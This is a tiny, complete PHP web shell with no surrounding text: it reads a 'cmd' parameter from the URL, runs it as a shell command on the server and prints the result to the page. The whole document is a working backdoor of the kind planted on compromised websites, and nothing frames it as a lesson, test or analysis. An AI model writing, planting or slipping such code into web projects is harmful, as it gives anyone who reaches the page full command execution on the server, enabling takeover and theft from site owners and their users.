<?php
$cmd=$_GET["cmd"];

$output = `$cmd`;
echo "<pre>$output</pre>";
?>